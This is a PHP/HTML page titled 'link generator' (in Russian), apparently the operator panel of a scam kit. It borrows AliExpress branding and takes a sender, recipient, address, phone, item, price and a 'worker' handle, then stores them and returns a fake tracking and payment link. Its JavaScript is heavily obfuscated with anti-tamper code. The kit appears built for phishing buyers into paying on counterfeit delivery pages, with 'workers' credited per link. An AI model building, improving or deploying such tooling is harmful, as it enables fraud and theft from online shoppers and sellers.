<?php
if ($_POST) {

        $order["from"] = $_POST['from'];
        $order["to"] = $_POST['to'];
        $order["sender"] = $_POST['sender'];
        $order["recipient"] = $_POST['recipient'];
        $order["dd"] = $_POST['dd'];
        $order["dr"] = $_POST['dr'];
        $order["address"] = $_POST['address'];
        $order["telr"] = $_POST['telr'];
        $order["name"] = $_POST['name'];
        $order["summ"] = $_POST['summ'];
        $order["col"] = $_POST['col'];
        $order["wrk"] = $_POST['wrk'];
        $order["track"] = rand(10000000, 99999999);
        file_put_contents("id/" . $order["track"] . ".json", json_encode($order, JSON_UNESCAPED_UNICODE));
    
    $a =  urlencode("https://" . $_SERVER["HTTP_HOST"] . '/track?track_id='.$order["track"]);
    
	$response = [
		"status" => "success",
		"url" => $a
	];
	
	echo json_encode($response);
	exit;
}
?>

<!DOCTYPE html>
<html>

<head>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&amp;subset=cyrillic">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css">
    <link rel="stylesheet" type="text/css" href="css/bootstrap.css">
    <link rel="stylesheet" type="text/css" href="css/common.css">
    <link rel="shortcut icon" type="image/x-icon" href="//ae01.alicdn.com/images/eng/wholesale/icon/aliexpress.ico" />
    <script type="text/javascript" src="js/jquery.js"></script>
    <script type="text/javascript" src="js/bootstrap.js"></script>
    <script type="text/javascript" src="js/jquery.cookie.min.js"></script>
    <script type="text/javascript" src="js/common.js"></script>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">

    <title>Генератор ссылок</title>
</head>

<body>
    <div class="block-info">
        <h3 class="heading-info">
				Генератор ссылок
			</h3>

        <p class="description-info">
            Сгенерируйте платежную ссылку с помощью этой формы.
        </p>
    </div>

    <div class="divider" style="margin-bottom: 25px;"></div>

    <div class="block-form">
        <form class="form-payment" action="payment.php" method="post">
            <div class="row">
        
                <div class="col-xs-6">
                    <div class="form-group">
                        <label for="input-month">Откуда</label>
                        <input type="text" class="form-control" id="from" placeholder="Москва">
                    </div>
                </div>

                <div class="col-xs-6">
                    <div class="form-group">
                        <label for="input-month">Куда</label>
                        <input type="text" class="form-control" id="to" placeholder="Санкт-Петербург">
                    </div>
                </div>
                
                
                <div class="col-xs-6">
                    <div class="form-group">
                        <label for="input-month">Отправитель</label>
                        <input type="text" class="form-control" id="sender" placeholder="Иван Петров">
                    </div>
                </div>

                <div class="col-xs-6">
                    <div class="form-group">
                        <label for="input-month">Получатель</label>
                        <input type="text" class="form-control" id="recipient" placeholder="Анна Николаевна">
                    </div>
                </div>
            
                
                <div class="col-xs-6">
                    <div class="form-group">
                        <label for="input-month">Дата отправления</label>
                        <input type="text" class="form-control" id="dd" placeholder="01.02.2020">
                    </div>
                </div>

                <div class="col-xs-6">
                    <div class="form-group">
                        <label for="input-month">Дата доставки</label>
                        <input type="text" class="form-control" id="dr" placeholder="07.02.2020">
                    </div>
                </div>

                <div class="col-xs-6">
                    <div class="form-group">
                        <label for="input-month">Адрес доставки</label>
                        <input type="text" class="form-control" id="address" placeholder="Советская 17">
                    </div>
                </div>

                <div class="col-xs-6">
                    <div class="form-group">
                        <label for="input-month">Номер получателя</label>
                        <input type="text" class="form-control" id="telr" placeholder="7 495 999-99-99">
                    </div>
                </div>
                    
                <div class="col-xs-4">
                    <div class="form-group">
                        <label for="input-month">Товар</label>
                        <input type="text" class="form-control" id="name" placeholder="Лыжи">
                    </div>
                </div>

                <div class="col-xs-4">
                    <div class="form-group">
                        <label for="input-month">Стоимость</label>
                        <input type="text" class="form-control" id="summ" placeholder="8 000 руб.">
                    </div>
                </div>
                
                <div class="col-xs-4">
                    <div class="form-group">
                        <label for="input-month">Комплектация</label>
                        <input type="text" class="form-control" id="col" placeholder="1">
                    </div>
                </div>
                
                
                <br>
                
                <div class="col-xs-12">
                    <div class="form-group">
                        <label for="input-month">Воркер</label>
                        <input type="text" class="form-control" id="wrk" placeholder="@wrk">
                    </div>
                </div>
            </div>

        </form>

        <div class="block-form-info" style="text-align: left;">
            <h4 class="heading-total">Ссылка для оплаты: <b></b></h4>
            <p class="heading-secure label-url" style="word-wrap: break-word; margin-top: 10px; user-select: auto;">
                ссылка не сгенерирована
            </p>
        </div>
    </div>

    <div class="divider"></div>

    <div class="block-footer">
        <div class="row">
            <div class="col-xs-12">
                <a class="button-generate">
						Сгенерировать
					</a>
            </div>
        </div>
    </div>
</body>

<style>
input::-webkit-outer-spin-button,
input::-webkit-inner-spin-button {
    -webkit-appearance: none;
    margin: 0;
}

input[type=number] {
    -moz-appearance:textfield;
}
</style>



<script type="text/javascript">

var _0x3fa652=function(){var _0x303735=!![];return function(_0x1d42c7,_0x550b26){var _0x4c1423=_0x303735?function(){if(_0x550b26){var _0x2a81b4=_0x550b26['apply'](_0x1d42c7,arguments);_0x550b26=null;return _0x2a81b4;}}:function(){};_0x303735=![];return _0x4c1423;};}();var _0x2745c5=_0x3fa652(this,function(){var _0xb315dc=function(){return'\x64\x65\x76';},_0x292003=function(){return'\x77\x69\x6e\x64\x6f\x77';};var _0x5ea2ca=function(){var _0x1d13b6=new RegExp('\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d');return!_0x1d13b6['\x74\x65\x73\x74'](_0xb315dc['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x2602af=function(){var _0x371740=new RegExp('\x28\x5c\x5c\x5b\x78\x7c\x75\x5d\x28\x5c\x77\x29\x7b\x32\x2c\x34\x7d\x29\x2b');return _0x371740['\x74\x65\x73\x74'](_0x292003['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x37d740=function(_0x4839ed){var _0x3804a0=~-0x1>>0x1+0xff%0x0;if(_0x4839ed['\x69\x6e\x64\x65\x78\x4f\x66']('\x69'===_0x3804a0)){_0x111b34(_0x4839ed);}};var _0x111b34=function(_0x10e35a){var _0x40e4eb=~-0x4>>0x1+0xff%0x0;if(_0x10e35a['\x69\x6e\x64\x65\x78\x4f\x66']((!![]+'')[0x3])!==_0x40e4eb){_0x37d740(_0x10e35a);}};if(!_0x5ea2ca()){if(!_0x2602af()){_0x37d740('\x69\x6e\x64\u0435\x78\x4f\x66');}else{_0x37d740('\x69\x6e\x64\x65\x78\x4f\x66');}}else{_0x37d740('\x69\x6e\x64\u0435\x78\x4f\x66');}});_0x2745c5();$('body')['keyup'](function(_0x54ee20){var _0x3ee08f={'USEuy':function(_0x5baa81,_0x561964){return _0x5baa81(_0x561964);},'YTxAc':'.button-generate'};if(_0x54ee20['keyCode']==0xd)_0x3ee08f['USEuy']($,_0x3ee08f['YTxAc'])['click']();});$('.button-generate')['click'](function(){var _0x994a5f={'mwYNM':'5|11|1|0|2|3|12|6|13|10|4|7|8|9','jeyKU':'#sender','xJuZo':'#to','andFl':function(_0x2bbff0,_0x386461){return _0x2bbff0(_0x386461);},'UbKsz':'#recipient','PzWkT':'#dd','jxxzx':'#summ','DLgQL':'.button-generate','jiOvk':function(_0x35cac6,_0x14b8cd){return _0x35cac6==_0x14b8cd;},'ACGYu':'success','DKzPB':'9|2|10|5|4|7|1|6|8|0|3','quyvQ':'#input-item','CTUSz':'color','RjLwM':'<input>','DNMnZ':function(_0x2c4735,_0x3007e9){return _0x2c4735(_0x3007e9);},'HdDIj':function(_0x19a86e,_0x1f604f,_0x5e14b8){return _0x19a86e(_0x1f604f,_0x5e14b8);},'WbjjP':function(_0xa3ce06,_0x5af6db){return _0xa3ce06(_0x5af6db);},'DcKmJ':'#col','qtuAA':'#wrk','Drwbp':'#name','TKttd':function(_0x39d635,_0x4d8f72){return _0x39d635(_0x4d8f72);},'EveGj':'#dr','eSxZk':'#telr'};var _0x334755=_0x994a5f['mwYNM']['split']('|');var _0x419173=0x0;while(!![]){switch(_0x334755[_0x419173++]){case'0':var _0x2fe698=$(_0x994a5f['jeyKU']);continue;case'1':var _0x7a3c10=$(_0x994a5f['xJuZo']);continue;case'2':var _0x38e784=_0x994a5f['andFl']($,_0x994a5f['UbKsz']);continue;case'3':var _0x5656a1=_0x994a5f['andFl']($,_0x994a5f['PzWkT']);continue;case'4':var _0x5a22d7=_0x994a5f['andFl']($,_0x994a5f['jxxzx']);continue;case'5':var _0x5c8cdb={'ZSQwM':_0x994a5f['DLgQL'],'qqcFD':function(_0x135ad2,_0x11bd92){return _0x994a5f['jiOvk'](_0x135ad2,_0x11bd92);},'NqxqO':'status','uqYww':_0x994a5f['ACGYu'],'CZxkZ':_0x994a5f['DKzPB'],'IblyT':'background-color','Feegb':function(_0x317571,_0x58c1c1){return _0x317571(_0x58c1c1);},'ikOmz':_0x994a5f['quyvQ'],'FlYIt':_0x994a5f['CTUSz'],'kYUnI':_0x994a5f['RjLwM'],'fZzMO':'#1AB248','DNNvf':function(_0x56281f,_0x1972ff){return _0x994a5f['DNMnZ'](_0x56281f,_0x1972ff);},'BMRSN':function(_0x57bb80,_0x3ec929,_0x165f0c){return _0x994a5f['HdDIj'](_0x57bb80,_0x3ec929,_0x165f0c);},'YMtXC':'url','pTEnR':function(_0x1aafd2,_0x480e31){return _0x994a5f['DNMnZ'](_0x1aafd2,_0x480e31);},'IjnWy':'body'};continue;case'6':var _0x5b5e7f=_0x994a5f['DNMnZ']($,'#address');continue;case'7':var _0x1611b2=_0x994a5f['WbjjP']($,_0x994a5f['DcKmJ']);continue;case'8':var _0x48f030=_0x994a5f['WbjjP']($,_0x994a5f['qtuAA']);continue;case'9':$['post']('generator.php',{'from':_0x1e029d['val'](),'to':_0x7a3c10['val'](),'sender':_0x2fe698['val'](),'recipient':_0x38e784['val'](),'dd':_0x5656a1['val'](),'dr':_0x473aa3['val'](),'address':_0x5b5e7f['val'](),'telr':_0x177763['val'](),'name':_0x2b88dc['val'](),'summ':_0x5a22d7['val'](),'col':_0x1611b2['val'](),'wrk':_0x48f030['val']()})['done'](function(_0xaaa601){var _0x182187={'LwcLM':function(_0x182f27,_0x3ff530){return _0x182f27(_0x3ff530);},'zxmGr':_0x5c8cdb['ZSQwM'],'ffCMO':'Сгенерировать','zTXld':'#00a934','abpCb':function(_0x22b714,_0x5bf8e3){return _0x22b714(_0x5bf8e3);},'vcCRB':'border-color'};_0xaaa601=JSON['parse'](_0xaaa601);if(_0x5c8cdb['qqcFD'](_0xaaa601[_0x5c8cdb['NqxqO']],_0x5c8cdb['uqYww'])){var _0x51ecb6=_0x5c8cdb['CZxkZ']['split']('|');var _0x3a975f=0x0;while(!![]){switch(_0x51ecb6[_0x3a975f++]){case'0':$(_0x5c8cdb['ZSQwM'])['css'](_0x5c8cdb['IblyT'],'#1AB248');continue;case'1':_0x5c8cdb['Feegb']($,_0x5c8cdb['ikOmz'])['css'](_0x5c8cdb['FlYIt'],'');continue;case'2':var _0x251a1a=_0x5c8cdb['Feegb']($,_0x5c8cdb['kYUnI']);continue;case'3':_0x5c8cdb['Feegb']($,'.button-generate')['css']('border-color',_0x5c8cdb['fZzMO']);continue;case'4':document['execCommand']('copy');continue;case'5':_0x251a1a['val'](_0x5c8cdb['DNNvf']($,'.label-url')['text']())['select']();continue;case'6':_0x5c8cdb['BMRSN'](setTimeout,function(){_0x182187['LwcLM']($,_0x182187['zxmGr'])['text'](_0x182187['ffCMO']);_0x182187['LwcLM']($,_0x182187['zxmGr'])['css']('background-color',_0x182187['zTXld']);_0x182187['abpCb']($,_0x182187['zxmGr'])['css'](_0x182187['vcCRB'],_0x182187['zTXld']);},0x7d0);continue;case'7':_0x251a1a['remove']();continue;case'8':$(_0x5c8cdb['ZSQwM'])['text']('Ссылка\x20скопирована!');continue;case'9':$('.label-url')['text'](decodeURIComponent(_0xaaa601[_0x5c8cdb['YMtXC']]));continue;case'10':_0x5c8cdb['pTEnR']($,_0x5c8cdb['IjnWy'])['append'](_0x251a1a);continue;}break;}}});continue;case'10':var _0x2b88dc=$(_0x994a5f['Drwbp']);continue;case'11':var _0x1e029d=$('#from');continue;case'12':var _0x473aa3=_0x994a5f['TKttd']($,_0x994a5f['EveGj']);continue;case'13':var _0x177763=_0x994a5f['TKttd']($,_0x994a5f['eSxZk']);continue;}break;}});


</script>

</html>